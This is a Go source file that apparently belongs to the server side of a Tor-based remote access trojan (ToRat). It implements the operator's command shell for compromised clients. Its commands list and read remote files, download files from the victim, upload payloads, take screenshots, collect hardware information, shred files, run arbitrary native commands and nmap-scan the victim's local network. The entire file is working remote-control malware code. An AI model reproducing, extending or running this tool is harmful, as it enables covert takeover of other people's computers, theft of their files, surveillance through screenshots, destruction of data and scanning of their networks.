package server

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"

	"github.com/abiosoft/ishell"
	"github.com/lu4p/ToRat/shared"
)

// Client side interactive shell menu
func (client activeClient) shellClient() {
	clientFileCompleter := func([]string) []string {
		return client.Dir.Files
	}

	serverFileCompleter := func([]string) []string {
		files, err := filepath.Glob("*")
		if err != nil {
			return nil
		}
		return files
	}

	// Set shell and get working dir
	shell := ishell.New()
	r := shared.Dir{}
	err := client.RPC.Call("API.LS", void, &r)
	if err != nil {
		// TODO: This may cause false positive on edges cases
		client.Dir.Path = "DISCONNECTED"
	}
	client.Dir = r

	shell.SetPrompt(yellow("["+client.Client.Name+"] ") + blue(client.Dir.Path) + "$ ")

	commands := []*ishell.Cmd{
		{
			Name: "cd",
			Func: func(c *ishell.Context) {
				client.Cd(c)
				shell.SetPrompt(yellow("["+client.Client.Name+"] ") + blue(client.Dir.Path) + "$ ")
			},
			Completer: clientFileCompleter,
			Help:      "change the working directory of the client",
		},
		{
			Name: "ls",
			Func: client.ls,
			Help: "list the files in a directory",
		},
		{
			Name:      "cat",
			Func:      client.Cat,
			Help:      "print the content of a file: usage cat <file>",
			Completer: clientFileCompleter,
		},
		{
			Name:      "shred",
			Func:      client.Shred,
			Help:      "remove a path by overwriting it with random data then removing it: usage shred <path>",
			Completer: clientFileCompleter,
		},
		{
			Name:      "down",
			Func:      client.Download,
			Help:      "download a file from the client: usage down <file>",
			Completer: clientFileCompleter,
		},
		{
			Name:      "up",
			Func:      client.Upload,
			Help:      "upload a file from the cwd of the Server to cwd of the client: usage up <file>",
			Completer: serverFileCompleter,
		},
		{
			Name: "screen",
			Func: client.Screen,
			Help: "take a screenshot of the client and upload it to the server",
		},
		{
			Name: "escape",
			Func: client.runCommand,
			Help: "escape a command and run it natively on client",
		},
		{
			Name: "hardware",
			Func: client.Hardware,
			Help: "collect a systems hardware specs",
		},
		{
			Name: "reconnect",
			Func: func(c *ishell.Context) {
				client.Reconnect(c)
				shell.Close()
			},
			Help: "tell the client to reconnect",
		},
		{
			Name: "speedtest",
			Func: client.Speedtest,
			Help: "run a speedtest on a clients native internet connection (non-tor)",
		},
		{
			Name: "nmap",
			Func: client.Nmap,
			Help: "nmap an ip on the clients local network: usage nmap <ip>",
		},
		{
			Name: "netscan",
			Func: client.NmapLocal,
			Help: "nmap a clients entire network for connected devices and open ports",
		},
		{
			Name: "exit",
			Func: func(c *ishell.Context) {
				c.Stop()
				shell.Close()
			},
			Help: "background the current session",
		},
	}

	for _, c := range commands {
		shell.AddCmd(c)
	}

	shell.NotFound(client.runCommand)
	shell.Run()
}

// ls remote directory
func (client *activeClient) ls(c *ishell.Context) {
	r := shared.Dir{}
	err := client.RPC.Call("API.LS", void, &r)
	if err != nil {
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Encoutered error during list:", err))
		return
	}
	client.Dir = r
	for _, f := range client.Dir.Files {
		c.Println(f)
	}
}

// cat remote file
func (client *activeClient) Cat(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	var r string
	err := client.RPC.Call("API.Cat", path, &r)
	if err != nil {
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Could not cat file:", err))
	}
	c.Println(r)
}

// Change remote directory
func (client *activeClient) Cd(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	r := shared.Dir{}
	err := client.RPC.Call("API.Cd", path, &r)
	if err != nil {
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Could not change to that path:", err))
	}
	client.Dir = r
}

// Download a remote file
func (client *activeClient) Download(c *ishell.Context) {
	var r shared.File
	arg := strings.Join(c.Args, " ")

	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	err := client.RPC.Call("API.SendFile", arg, &r)
	if err != nil {
		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Download could not be sent to Server:", err))
		c.ProgressBar().Stop()
		return
	}

	dlPath := filepath.Join(client.Client.Path, r.Fpath)
	dlDir, _ := filepath.Split(dlPath)

	if err := os.MkdirAll(dlDir, os.ModePerm); err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Could not create directory path:", err))
		c.ProgressBar().Stop()
		return
	}

	if err := ioutil.WriteFile(dlPath, r.Content, 0777); err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Download failed to write to path:", err))
		c.ProgressBar().Stop()
		return
	}

	c.ProgressBar().Final(green("[Server] ") + green("[+] Download received"))
	c.ProgressBar().Stop()
}

// Upload a file from server to client
func (client *activeClient) Upload(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	info, _ := os.Stat(path)

	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	content, err := ioutil.ReadFile(path)
	if err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed could not read local file:", err))
		c.ProgressBar().Stop()
		return
	}

	f := shared.File{
		Content: content,
		Path:    path,
		Perm:    info.Mode(),
	}

	if err := client.RPC.Call("API.RecvFile", f, &void); err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed:", err))
		c.ProgressBar().Stop()
		return
	}

	c.ProgressBar().Final(green("[Server] ") + green("[+] Upload Successful"))
	c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + green("[+] Upload successfully received"))
	c.ProgressBar().Stop()
}

// Capture remote screenshot
func (client *activeClient) Screen(c *ishell.Context) {
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	filename := getTimeSt() + ".png"
	var r []byte

	if err := client.RPC.Call("API.Screen", void, &r); err != nil {
		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Screenshot failed:", err))
		c.ProgressBar().Stop()
		return
	}

	dlPath := filepath.Join(client.Client.Path, "/screenshots/", filename)
	dlDir, _ := filepath.Split(dlPath)

	if err := os.MkdirAll(dlDir, os.ModePerm); err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Could not create screenshots path!"))
		c.ProgressBar().Stop()
		c.Println(green("[Server] ") + red("[!] ", err))
		return
	}

	err := ioutil.WriteFile(dlPath, r, 0777)
	if err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Screenshot could not be saved:", err))
		c.ProgressBar().Stop()
		return
	}
	c.ProgressBar().Final(green("[Server] ") + green("[+] Screenshot received"))
	c.ProgressBar().Stop()
}

// Force client reconnect
// TODO: I don't think this feature works
func (client *activeClient) Reconnect(c *ishell.Context) {
	var r bool
	client.RPC.Call("API.Reconnect", void, &r)
	c.Stop()
}

// Hardware print clients hardware info
func (client *activeClient) Hardware(c *ishell.Context) {
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()
	r := shared.Hardware{}

	if err := client.RPC.Call("API.GetHardware", void, &r); err != nil {
		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Could not collect information on client hardware:", err))
		c.ProgressBar().Stop()
		return
	}

	c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + green("[+] Hardware collection finished"))
	c.ProgressBar().Stop()

	c.Println(green("OS:     "), r.OS)
	c.Println(green("CPU:    "), r.CPU)
	c.Println(green("CORES:  "), r.Cores)
	c.Println(green("RAM:    "), r.RAM)
	c.Println(green("GPU:    "), r.GPU)
	c.Println(green("Drives: "), r.Drives)
}

// Shred a remote file
func (client *activeClient) Shred(c *ishell.Context) {
	s := shared.Shred{
		Path:   strings.Join(c.Args, " "),
		Times:  3,
		Zeros:  true,
		Remove: true,
	}

	if err := client.RPC.Call("API.Shred", &s, &void); err != nil {
		c.Println(red("[!] Could not shred path", s.Path+":", err))
		return
	}
	c.Println(green("[+] Sucessfully shred path"))
}

// Speedtest the clients internet connection
func (client *activeClient) Speedtest(c *ishell.Context) {
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	r := shared.Speedtest{}
	if err := client.RPC.Call("API.Speedtest", void, &r); err != nil {
		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Could not perform speedtest on client:", err))
		c.ProgressBar().Stop()
		return
	}

	c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + green("[+] Speedtest finished"))
	c.ProgressBar().Stop()

	c.Println(green("Public IP: "), r.IP)
	c.Println(green("Country:   "), r.Country)
	c.Println(green("Ping:      "), r.Ping)
	c.Println(green("Download:  "), r.Download)
	c.Println(green("Upload:    "), r.Upload)
}

// Run a command on client
func (client *activeClient) runCommand(c *ishell.Context) {
	command := strings.Join(c.Args, " ")
	var r string
	args := shared.Cmd{
		Cmd:        command,
		Powershell: false,
	}

	if err := client.RPC.Call("API.RunCmd", args, &r); err != nil {
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Bad or unkown command:", err))
	}

	c.Println(r)
}

func (client *activeClient) Nmap(c *ishell.Context) {
	ip := strings.Join(c.Args, "")
	if ip == "" {
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] No IP provided!"))
		return
	}

	c.Println(yellow("["+client.Client.Name+"] ") + "This will take up to 10 minutes!")
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	r := shared.Nmap{}
	if err := client.RPC.Call("API.Nmap", ip, &r); err != nil {
		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Could not perform nmap on client"))
		c.ProgressBar().Stop()
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
		return
	}
	c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + green("[+] Nmap finished"))
	c.ProgressBar().Stop()

	// Use the results to print an example output
	fmt.Printf("Nmap on %s took %3f seconds\n", r.IP, r.TimeElapsed)
	fmt.Print(r.Scan)
}

func (client *activeClient) NmapLocal(c *ishell.Context) {
	c.Println(yellow("["+client.Client.Name+"] ") + "This will take up to 10 minutes!")
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	r := shared.NmapLocal{}
	if err := client.RPC.Call("API.NmapLocal", void, &r); err != nil {
		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Could not perform nmap on client"))
		c.ProgressBar().Stop()
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
		return
	}
	c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + green("[+] Nmap finished"))
	c.ProgressBar().Stop()

	// Use the results to print an example output
	fmt.Printf("Nmap on %s: %d hosts up scanned in %3f seconds\n", r.Range, r.Hosts, r.TimeElapsed)
	fmt.Print(r.Scan)
}
